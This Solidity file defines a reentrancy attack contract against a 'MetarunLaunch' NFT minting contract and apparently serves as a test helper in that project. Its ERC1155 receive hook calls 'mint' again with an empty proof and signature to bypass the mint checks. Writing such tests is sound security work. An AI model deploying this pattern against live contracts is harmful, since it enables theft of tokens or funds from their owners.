//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../MetarunLaunch.sol";

contract MetarunReentrantExploit {
    address private _targetContract;

    constructor(address target) {
        _targetContract = target;
    }

    function exploit(
        uint32 qty,
        bytes32[] calldata proof,
        uint64 timestamp,
        bytes calldata signature
    ) public payable {
        MetarunLaunch(_targetContract).mint{value: msg.value}(
            qty,
            proof,
            timestamp,
            signature
        );
    }

    function onERC1155Received(
        address, // unused param: operator
        address, // unused param: from
        uint256, // unused param: id
        uint256, // unused param: value
        bytes calldata // unused param: data
    ) public payable returns (bytes4) {
        bytes32[] memory proof;
        MetarunLaunch(_targetContract).mint{value: msg.value}(1, proof, 0, "");
        return
            bytes4(
                keccak256(
                    "onERC1155Received(address,address,uint256,uint256,bytes)"
                )
            );
    }
}
